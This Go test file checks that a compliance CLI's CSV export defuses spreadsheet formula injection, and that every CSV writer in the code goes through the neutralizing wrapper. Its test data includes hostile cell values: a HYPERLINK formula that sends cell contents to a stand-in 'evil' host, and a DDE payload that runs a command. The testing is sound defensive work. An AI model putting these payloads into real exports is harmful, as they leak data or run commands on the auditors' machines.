package report_test

import (
	"bytes"
	"encoding/csv"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sigcomply/sigcomply-cli/internal/report"
)

// formulaPrefixes are the first characters a spreadsheet treats as the
// start of a formula (OWASP "CSV injection"): a cell an auditor opens
// in Excel or Sheets must never start with one.
const formulaPrefixes = "=+-@\t\r"

// TestFormatCSV_NeutralizesFormulas: violation reasons, exception
// reasons and approvers come from resource names, API responses and
// the project's config. A cell such as =HYPERLINK("http://evil/?"&A1)
// would run when an auditor opens the export.
func TestFormatCSV_NeutralizesFormulas(t *testing.T) {
	hostile := []string{`=HYPERLINK("http://evil/?"&A1,"x")`, "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\tx", "\rx"}
	snaps := []*report.Snapshot{
		{View: report.ViewLatest, Latest: &report.LatestView{Policies: []report.LatestPolicy{
			{PolicyID: hostile[0], ControlID: hostile[1], Status: hostile[2], Severity: hostile[3], Category: hostile[4], RunID: hostile[5], ExceptionID: hostile[0], Reason: hostile[1]},
		}}},
		{View: report.ViewExceptions, Exceptions: &report.ExceptionsView{Exceptions: []report.ExceptionEntry{
			{PolicyID: hostile[0], State: hostile[1], Scope: hostile[2], ApprovedBy: hostile[3], ApprovedAt: hostile[4], ExpiresAt: hostile[5], Reason: hostile[0], FirstSeenRunID: hostile[1], LastSeenRunID: hostile[2]},
		}}},
	}
	for _, snap := range snaps {
		var buf bytes.Buffer
		if err := report.FormatCSV(&buf, snap); err != nil {
			t.Fatalf("%s: %v", snap.View, err)
		}
		rows, err := csv.NewReader(&buf).ReadAll()
		if err != nil {
			t.Fatalf("%s: parse output: %v", snap.View, err)
		}
		for _, row := range rows[1:] {
			for _, cell := range row {
				if cell != "" && strings.ContainsRune(formulaPrefixes, rune(cell[0])) {
					t.Errorf("%s: cell %q starts a formula", snap.View, cell)
				}
			}
		}
		if !strings.Contains(strings.Join(rows[1], ","), "HYPERLINK") {
			t.Errorf("%s: the text itself should be kept, only defused: %v", snap.View, rows[1])
		}
	}
}

// TestCSVWritersAreNeutralized is the class guard: the only
// csv.NewWriter in the CLI is the one FormatCSV wraps in the
// neutralizing writer, so a new CSV output cannot skip it.
func TestCSVWritersAreNeutralized(t *testing.T) {
	root := filepath.Join("..", "..")
	var sites []string
	for _, dir := range []string{"internal", "cmd"} {
		err := filepath.WalkDir(filepath.Join(root, dir), func(path string, d os.DirEntry, err error) error {
			if err != nil {
				return err
			}
			if d.IsDir() || !strings.HasSuffix(path, ".go") || strings.HasSuffix(path, "_test.go") {
				return nil
			}
			src, err := os.ReadFile(path) //nolint:gosec // walking the repo's own sources
			if err != nil {
				return err
			}
			if bytes.Contains(src, []byte("csv.NewWriter(")) {
				sites = append(sites, filepath.ToSlash(path))
			}
			return nil
		})
		if err != nil {
			t.Fatal(err)
		}
	}
	if len(sites) != 1 || !strings.HasSuffix(sites[0], "internal/report/csv_safe.go") {
		t.Errorf("csv.NewWriter used in %v; write CSV only through report's neutralizing writer (csv_safe.go)", sites)
	}
}
